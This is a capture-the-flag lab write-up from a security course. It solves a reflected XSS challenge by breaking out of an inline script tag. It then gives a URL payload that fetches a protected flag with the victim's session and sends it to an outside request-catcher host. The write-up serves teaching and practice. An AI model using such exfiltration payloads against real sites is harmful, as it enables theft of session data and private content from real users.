---
title: Simple Web 0x11(Lab - XSS Me)
tags: [NTUSTWS, CTF, Web]

category: "Security Course｜NTUST WS｜Fronted"
date: 2023-02-09
---

# Simple Web 0x11(Lab - XSS Me)
<!-- more -->
###### tags: `NTUSTWS` `CTF` `Web`
Challenge: http://h4ck3r.quest:8800/

## Background
攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客(這是其中一種受害方式，也可能很直接的被盜取`COOKIE`之類的)
![](https://i.imgur.com/lZ0bj41.png)

![](https://i.imgur.com/grJXpr7.png)

![](https://i.imgur.com/q9fwa6z.png)

## Source code
```javascript
...
<script>
    const message = {"icon": "error", "titleText": "User not found.", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true};
    window.onload = function () {
        if (message !== null) Swal.fire(message);
    }
</script>
...
```

## Exploit
1. Check XSS
    ```javascript
    ...
    <script>
        const message = {"icon": "error", "titleText": "youshallnotpass", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true};
        window.onload = function () {
            if (message !== null) Swal.fire(message);
        }
    </script>
    ...
    ```
    ![](https://i.imgur.com/OffMAUF.png)
2. Try to inject script tag
Payload: `http://h4ck3r.quest:8800/?type=error&message=%3C/script%3E%3Cscript%3Ealert(123)%3C/script%3E//`
    ```javascript
    ...
    <script>
        const message = {"icon": "error", "titleText": "</script><script>alert(123)</script>//", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true};
        window.onload = function () {
            if (message !== null) Swal.fire(message);
        }
    </script>
    ```
    ![](https://i.imgur.com/1cZJvIv.png)
* Hint: If you login as guest(password = guest), then you can get the response
![](https://i.imgur.com/s2R75Xf.png)

3. Fetch flag and send to [beeceptor](https://beeceptor.com/)
    * Payload: 
        ```
        http://h4ck3r.quest:8800/?message=%3C/script%3E%3Cscript%3Efetch(`/getflag\).then(r=%3Er.text()).then(flag=%3Elocation.href=`https://sbk6401.free.beeceptor.com/?f=${flag}`)%3C/script%3E//
        ```
    * fetch(`/getflag`): 先用受害者的權限(可能是cookie或是session)請求flag
    * .then(r=>r.text()): 把response轉成文字
    * location.href=`https://your-server/?f=${flag}`: 瀏覽器跳轉到我指定的server，這樣子的話就會帶上從victim取得的flag
4. Report to admin. Then you got flag!!!